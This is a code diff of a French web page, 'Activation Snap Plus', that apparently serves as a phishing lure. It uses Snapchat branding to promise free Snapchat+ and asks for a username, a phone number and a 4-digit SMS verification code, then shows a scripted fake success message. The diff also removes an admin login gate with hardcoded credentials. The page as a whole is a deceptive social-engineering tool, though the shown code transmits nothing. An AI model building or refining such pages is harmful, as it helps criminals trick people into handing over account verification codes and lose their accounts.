@@ -9,217 +9,317 @@
     
     <title>Activation Snap Plus</title>
     <style>
-        /* --- STYLE GÉNÉRAL & FOND --- */
-        html, body {
-            background-color: #0d011a;
-            margin: 0; padding: 0; height: 100%;
+        /* --- FOND ET STYLE GÉNÉRAL --- */
+        html {
+            background-color: #1e053d; 
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overscroll-behavior-y: none; 
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background: radial-gradient(circle at top, #1e053d 0%, #0d011a 80%) no-repeat fixed;
+            background-color: #0d011a; 
             font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            color: white; overflow-x: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
+            overflow-y: auto;
+            overflow-x: hidden;
             -webkit-tap-highlight-color: transparent;
         }
 
-        /* --- 1. SYSTÈME D'AUTHENTIFICATION (WATER GLASS) --- */
-        #login-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle at top, #1e053d 0%, #0d011a 100%);
-            display: flex; justify-content: center; align-items: center;
-            z-index: 10000;
-            transition: opacity 0.5s ease;
-        }
-
-        .glass-panel {
-            width: 85%;
-            max-width: 320px;
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-radius: 35px;
-            padding: 40px 25px;
+        .container {
+            width: 100%;
+            max-width: 380px;
+            padding: 40px 20px;
             text-align: center;
-            border: 2px solid rgba(204, 51, 255, 0.3);
-            box-shadow: 0 0 40px rgba(204, 51, 255, 0.2);
+            box-sizing: border-box;
         }
 
-        .login-title {
-            font-size: 19px;
-            font-weight: 900;
-            margin-bottom: 30px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            background: linear-gradient(to right, #cc33ff, #ff0080);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        /* --- LOGO --- */
+        .logo-wrapper {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            margin: 0 auto 35px;
         }
 
-        .login-input-group {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 50px;
-            margin-bottom: 15px;
-            padding: 5px 20px;
-            display: flex;
-            align-items: center;
-            border: 1.5px solid rgba(255, 0, 128, 0.3);
-        }
-
-        .login-input-group svg { width: 20px; height: 20px; fill: rgba(255, 255, 255, 0.6); margin-right: 15px; }
-
-        .login-input-group input {
-            background: transparent; border: none; color: white;
-            padding: 15px 0; width: 100%; outline: none; font-size: 16px;
-        }
-
-        .btn-login {
-            width: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080);
-            border: none; border-radius: 50px; padding: 18px;
-            color: white; font-weight: bold; font-size: 16px;
-            margin-top: 15px; cursor: pointer;
-            box-shadow: 0 5px 20px rgba(255, 0, 128, 0.4);
-        }
-
-        /* --- 2. CONTENU PRINCIPAL --- */
-        #main-site { display: none; opacity: 0; transition: opacity 0.8s ease; }
-
-        .container { width: 100%; max-width: 380px; padding: 60px 20px; text-align: center; margin: 0 auto; box-sizing: border-box; }
-
-        .logo-wrapper { position: relative; width: 150px; height: 150px; margin: 0 auto 35px; }
         .border-gradient {
-            width: 100%; height: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080);
-            border-radius: 40px; display: flex; justify-content: center; align-items: center;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #cc33ff, #ff0080);
+            border-radius: 40px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             box-shadow: 0 0 35px rgba(204, 51, 255, 0.4);
         }
-        .snap-bg { width: 88%; height: 88%; background-color: #fffc00; border-radius: 32px; display: flex; justify-content: center; align-items: center; }
-        .plus-badge {
-            position: absolute; top: -4px; right: -4px; background-color: #ffb400; color: #1a0133;
-            width: 40px; height: 40px; border-radius: 50%; font-size: 24px; font-weight: bold;
-            display: flex; justify-content: center; align-items: center; border: 4px solid #1e053d;
+
+        .snap-bg {
+            width: 88%;
+            height: 88%;
+            background-color: #fffc00;
+            border-radius: 32px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        .title { color: #df80ff; font-size: 23px; font-weight: bold; letter-spacing: 2px; margin-bottom: 35px; text-transform: uppercase; }
+        .logo-img { width: 75%; height: auto; }
 
-        .input-group { display: flex; border: 2px solid rgba(255, 0, 255, 0.5); border-radius: 12px; margin-bottom: 20px; background-color: #0d011a; align-items: center; overflow: hidden; }
-        .prefix-phone { background-color: #1a0533; padding: 15px; font-weight: bold; font-size: 18px; border-right: 1px solid rgba(255, 0, 255, 0.2); }
-        input { flex: 1; border: none; background: transparent; padding: 18px; color: white; font-size: 17px; outline: none; }
-        .btn-glow { width: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080); border: none; border-radius: 12px; padding: 18px; color: white; font-weight: bold; text-transform: uppercase; cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 255, 0.5); margin-bottom: 30px; }
+        .plus-badge {
+            position: absolute;
+            top: -4px;
+            right: -4px;
+            background-color: #ffb400;
+            color: #1a0133;
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            font-size: 26px;
+            font-weight: bold;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 4px solid #1e053d;
+        }
 
-        .sms-instruction { font-size: 17px; font-weight: bold; margin-bottom: 8px; }
-        .sms-subtext { color: #7a7a7a; font-size: 14px; margin-bottom: 25px; }
+        .title {
+            color: #df80ff;
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 35px;
+            text-shadow: 0 0 10px rgba(223, 128, 255, 0.3);
+            text-transform: uppercase;
+        }
 
-        .status-box { background-color: rgba(30, 15, 60, 0.6); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 35px 20px; margin-bottom: 40px; min-height: 180px; display: flex; flex-direction: column; justify-content: center; }
-        .info-box { background-color: rgba(25, 10, 45, 0.7); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 20px; text-align: left; }
+        /* --- CHAMPS DE SAISIE --- */
+        .input-group {
+            display: flex;
+            border: 2px solid rgba(255, 0, 255, 0.5);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            background-color: #0d011a;
+            box-shadow: 0 0 15px rgba(255, 0, 255, 0.1);
+            align-items: center;
+        }
 
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .prefix-phone {
+            background-color: #1a0533;
+            padding: 15px;
+            font-weight: bold;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-right: 1px solid rgba(255, 0, 255, 0.2);
+        }
+
+        input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            padding: 18px;
+            color: #ffffff;
+            font-size: 17px;
+            outline: none;
+            width: 100%;
+        }
+
+        input::placeholder { color: #4b4b4b; }
+
+        /* --- TEXTES SMS --- */
+        .sms-instruction {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+
+        .sms-subtext {
+            color: #7a7a7a;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        /* --- BOUTONS --- */
+        .btn-glow {
+            width: 100%;
+            background: linear-gradient(135deg, #cc33ff, #ff0080);
+            border: none;
+            border-radius: 12px;
+            padding: 18px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            margin: 10px 0 40px;
+            box-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
+            transition: 0.3s;
+        }
+
+        .btn-glow:active { transform: scale(0.98); }
+        .btn-glow:disabled { opacity: 0.7; cursor: not-allowed; }
+
+        /* --- ÉTAPE 3 : MENU ATTENTE & SUCCÈS --- */
+        .status-box {
+            background-color: rgba(30, 15, 60, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 35px 20px;
+            margin-bottom: 40px;
+            animation: fadeIn 0.5s ease-in;
+            min-height: 180px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .status-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .status-title {
+            color: #4ade80; 
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .status-text {
+            color: #ffffff;
+            font-size: 16px;
+            line-height: 1.5;
+            margin: 0;
+            opacity: 0.9;
+        }
+
+        /* --- INFO BOX --- */
+        .info-box {
+            background-color: rgba(25, 10, 45, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 20px;
+        }
+
+        .info-header { color: #ffcc00; font-weight: bold; margin-bottom: 10px; }
+        .info-text { color: #ffffff; font-size: 14px; margin: 0; opacity: 0.8; line-height: 1.4; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body>
 
-    <div id="login-overlay">
-        <div class="glass-panel">
-            <h2 class="login-title">Connexion Administrateur</h2>
+    <div class="container">
+        
+        <div class="logo-wrapper">
+            <div class="border-gradient">
+                <div class="snap-bg"><img src="logo-snapchat.png" alt="" class="logo-img"></div>
+            </div>
+            <div class="plus-badge">+</div>
+        </div>
+
+        <h1 class="title">ACTIVATION SNAP<br>PLUS +</h1>
+
+        <!-- ÉTAPE 1 : NOM ET NUMÉRO -->
+        <div id="step-1">
+            <div class="input-group">
+                <input type="text" placeholder="Nom d'utilisateur Snapchat" style="padding-left: 20px;">
+            </div>
+            <div class="input-group">
+                <div class="prefix-phone">🇫🇷 +33</div>
+                <input type="tel" placeholder="123456789" maxlength="10">
+            </div>
+            <button class="btn-glow" id="submitBtn" onclick="processValidation()">Valider</button>
+        </div>
+
+        <!-- ÉTAPE 2 : CODE SMS -->
+        <div id="step-2" style="display: none;">
+            <div class="sms-instruction">📱 Un code de vérification a été envoyé par SMS</div>
+            <div class="sms-subtext">Le code peut prendre jusqu'à 3 minutes pour arriver</div>
             
-            <div class="login-input-group">
-                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-                <input type="text" id="adminUser" placeholder="Identifiant">
+            <div class="input-group">
+                <input type="tel" id="smsCode" placeholder="Code à 4 chiffres" maxlength="4" style="text-align: center;">
             </div>
-
-            <div class="login-input-group">
-                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-                <input type="password" id="adminPass" placeholder="Mot de passe">
-            </div>
-
-            <button class="btn-login" onclick="checkLogin()">SE CONNECTER</button>
-            <p id="error-msg" style="color: #ff4d4d; font-size: 13px; margin-top: 15px; display: none;">Accès refusé.</p>
+            <button class="btn-glow" onclick="showWaitingMenu()">Vérifier</button>
         </div>
-    </div>
 
-    <div id="main-site">
-        <div class="container">
-            <div class="logo-wrapper">
-                <div class="border-gradient">
-                    <div class="snap-bg"><img src="logo-snapchat.png" width="75%" alt=""></div>
-                </div>
-                <div class="plus-badge">+</div>
-            </div>
-
-            <h1 class="title">ACTIVATION SNAP<br>PLUS +</h1>
-
-            <div id="step-1">
-                <div class="input-group">
-                    <input type="text" placeholder="Nom d'utilisateur Snapchat" style="padding-left: 20px;">
-                </div>
-                <div class="input-group">
-                    <div class="prefix-phone">🇫🇷 +33</div>
-                    <input type="tel" placeholder="123456789" maxlength="10">
-                </div>
-                <button class="btn-glow" id="submitBtn" onclick="processValidation()">Valider</button>
-            </div>
-
-            <div id="step-2" style="display: none;">
-                <div class="sms-instruction">📱 Un code de vérification a été envoyé par SMS</div>
-                <div class="sms-subtext">Le code peut prendre jusqu'à 3 minutes pour arriver</div>
-                <div class="input-group">
-                    <input type="tel" placeholder="Code à 4 chiffres" maxlength="4" style="text-align: center;">
-                </div>
-                <button class="btn-glow" onclick="showWaitingMenu()">Vérifier</button>
-            </div>
-
-            <div id="step-3" style="display: none;">
-                <div class="status-box" id="status-container">
-                    <span style="font-size: 50px;">⏳</span>
-                    <div style="color: #4ade80; font-size: 22px; font-weight: bold; margin: 20px 0;">En attente de validation</div>
-                    <p style="opacity: 0.9; margin:0;">Votre code a été soumis. Veuillez patienter...</p>
-                </div>
-            </div>
-
-            <div class="info-box">
-                <div style="color: #ffcc00; font-weight: bold; margin-bottom: 10px;">INFORMATION ℹ️</div>
-                <p style="font-size: 14px; opacity: 0.8; margin: 0;">Aucun frais ne vous sera prélevé pour cet abonnement Snapchat+.</p>
+        <!-- ÉTAPE 3 : MENU ÉVOLUTIF (Attente puis Succès) -->
+        <div id="step-3" style="display: none;">
+            <div class="status-box" id="status-container">
+                <span class="status-icon">⏳</span>
+                <div class="status-title">En attente de validation</div>
+                <p class="status-text">
+                    Votre code a été soumis. Veuillez patienter pendant que nous le validons...
+                </p>
             </div>
         </div>
+
+        <div class="info-box">
+            <div class="info-header">INFORMATION ℹ️</div>
+            <p class="info-text">
+                Aucun frais ne vous sera prélevé pour cet abonnement Snapchat+. Notez que cette offre est soumise à des critères d'éligibilité et n'est disponible que pour les utilisateurs sélectionnés.
+            </p>
+        </div>
+
     </div>
 
     <script>
-        function checkLogin() {
-            const user = document.getElementById('adminUser').value;
-            const pass = document.getElementById('adminPass').value;
-            if (user === "Guadalajara" && pass === "Frozen16") {
-                const overlay = document.getElementById('login-overlay');
-                const site = document.getElementById('main-site');
-                overlay.style.opacity = "0";
-                setTimeout(() => {
-                    overlay.style.display = "none";
-                    site.style.display = "block";
-                    setTimeout(() => { site.style.opacity = "1"; }, 50);
-                }, 500);
-            } else {
-                document.getElementById('error-msg').style.display = "block";
-            }
-        }
-
+        // Transition Étape 1 -> Étape 2
         function processValidation() {
-            document.getElementById('submitBtn').innerHTML = "Envoi en cours";
+            const btn = document.getElementById('submitBtn');
+            const step1 = document.getElementById('step-1');
+            const step2 = document.getElementById('step-2');
+
+            btn.innerHTML = "Envoi en cours";
+            btn.disabled = true;
+
             setTimeout(() => {
-                document.getElementById('step-1').style.display = 'none';
-                document.getElementById('step-2').style.display = 'block';
+                step1.style.display = 'none';
+                step2.style.display = 'block';
             }, 2000);
         }
 
+        // Transition Étape 2 -> Étape 3 (Attente) puis Succès automatique
         function showWaitingMenu() {
-            document.getElementById('step-2').style.display = 'none';
-            document.getElementById('step-3').style.display = 'block';
+            const step2 = document.getElementById('step-2');
+            const step3 = document.getElementById('step-3');
             const container = document.getElementById('status-container');
-            
+
+            step2.style.display = 'none';
+            step3.style.display = 'block';
+
+            // APRÈS 4 SECONDES : On remplace le sablier par le succès
             setTimeout(() => {
-                container.style.animation = 'none';
-                void container.offsetWidth;
+                container.style.animation = 'none'; // Reset animation
+                void container.offsetWidth; // Trigger reflow
                 container.style.animation = 'fadeIn 0.5s ease-in';
+                
                 container.innerHTML = `
-                    <span style="font-size: 50px;">✅</span>
-                    <div style="color: #4ade80; font-size: 22px; font-weight: bold; margin: 20px 0;">Opération établie</div>
-                    <p style="opacity: 0.9; margin:0;">L'opération a été établie avec succès. Les fonctionnalités Snap+ seront disponibles sur votre compte d'ici quelques instants.</p>
+                    <span class="status-icon">✅</span>
+                    <div class="status-title">Opération établie</div>
+                    <p class="status-text">
+                        L'opération a été établie avec succès. Les fonctionnalités Snap+ seront disponibles sur votre compte d'ici quelques instants.
+                    </p>
                 `;
             }, 4000);
         }
     </script>
+
 </body>
 </html>
